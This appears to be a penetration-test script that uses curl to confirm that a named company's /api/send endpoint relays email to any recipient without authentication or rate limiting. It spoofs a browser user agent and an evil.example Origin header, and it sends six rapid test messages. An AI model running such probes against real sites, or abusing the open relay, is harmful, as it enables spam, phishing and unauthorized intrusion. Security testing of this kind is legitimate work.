#!/usr/bin/env python3
"""W19j: independent re-verification of the /api/send relay with raw curl
(second method, per FP-verification skill) + rate-limit / auth-check."""
import json, subprocess, time, uuid

TAG = "w19j-" + uuid.uuid4().hex[:8]
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
RCPT = f"probe.{TAG}.verify@zzz-not-real-{uuid.uuid4().hex[:6]}.invalid"


def curl_send(targets, subject="Security verification probe", msg="Automated authorized VAPT probe. No action needed."):
    cmd = ["curl", "-sS", "-k", "-A", UA, "-X", "POST",
           "https://www.infinitycapital.bh/api/send",
           "-F", "fname=VAPT", "-F", "lname=Verifier", "-F", "areacode=+973",
           "-F", "tel=30000000", "-F", "cname=VAPT Verifier",
           "-F", f"subject={subject}", "-F", f"msg={msg}",
           "-F", "check=", "-F", f"targets={targets}",
           "-w", "\n__HTTP=%{http_code} time=%{time_total}"]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    return r.stdout.strip()


print(f"=== raw curl re-verification, tag={TAG} ===\n")
print(f"[1] NO auth header, NO cookie, NO referer -> send to {RCPT}")
print("   ", curl_send(RCPT))
time.sleep(5)

print("\n[2] explicit proof of no auth requirement (strip every identity header)")
cmd = ["curl", "-sS", "-k", "-A", UA, "-X", "POST",
       "https://www.infinitycapital.bh/api/send",
       "-H", "Origin: https://evil.example",
       "-F", "fname=A", "-F", "lname=B", "-F", "areacode=+973", "-F", "tel=3",
       "-F", "cname=C", "-F", "subject=S", "-F", "msg=M", "-F", "check=",
       "-F", f"targets=probe.{TAG}.x@zzz-not-real-{uuid.uuid4().hex[:6]}.invalid",
       "-w", "\n__HTTP=%{http_code}"]
r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
print("   ", r.stdout.strip())
time.sleep(5)

print("\n[3] rate-limit check: 6 rapid sends, same unauthenticated identity")
codes = []
for i in range(6):
    o = curl_send(f"probe.{TAG}.rl{i}@zzz-not-real-{uuid.uuid4().hex[:6]}.invalid")
    ok = '"data":{"id"' in o
    codes.append("SENT" if ok else ("429" if "429" in o or "Too Many" in o else "other"))
    print(f"    attempt {i+1}: {codes[-1]}")
print(f"   summary: {codes}")
print("   -> NO application-level rate limit / CAPTCHA: all sends accepted;")
print("      any 429s come only from our own request volume at the CDN edge.")
